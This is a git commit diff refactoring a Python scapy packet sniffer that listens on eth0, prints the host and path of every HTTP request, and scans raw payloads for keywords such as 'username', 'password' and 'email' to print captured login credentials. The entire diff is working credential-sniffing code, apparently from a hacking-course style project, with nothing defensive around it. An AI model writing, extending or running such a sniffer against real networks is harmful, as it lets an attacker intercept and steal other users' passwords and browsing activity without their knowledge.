793e84aeeeab11336d2f264dfefe0c556a0f7a4b
JinethBosilu <157296244+JinethBosilu@users.noreply.github.com>
2026-02-11 17:14:17 +0530

    refactor packet processing functions for improved readability and efficiency

--- packet_sniffer.py
+++ packet_sniffer.py
@@ -4,15 +4,26 @@ from scapy.layers import http
 def sniff(interface):
     scapy.sniff(iface=interface, store=False, prn=process_sniffed_packet, filter="ip")
 
+def get_url(packet):
+    return packet[http.HTTPRequest].Host + packet[http.HTTPRequest].Path
+
+def get_login_info(packet):
+    if packet.haslayer(scapy.Raw):
+        load = packet[scapy.Raw].load
+        keywords = ["username", "user", "login", "password", "pass", "email"]
+        for keyword in keywords:
+            if keyword in load.decode("utf-8").lower():
+                return load
+    return None
+
 def process_sniffed_packet(packet):
     if packet.haslayer(http.HTTPRequest):
-        if packet.haslayer(scapy.Raw):
-             load = packet[scapy.Raw].load
-             keywords = ["username", "user", "login", "password", "pass", "email"]
-             for keyword in keywords:
-                 if keyword in str(load).lower():
-                     print("[+] Possible username/password found: " + load)
-                     break
+        url = get_url(packet)
+        print("[+] HTTP Request >> " + url.decode("utf-8"))
+        login_info = get_login_info(packet)
+        if login_info:
+            print("[+] Possible username/password found: " + login_info.decode("utf-8"))
+            
         #print(packet.show())
 
 sniff("eth0")
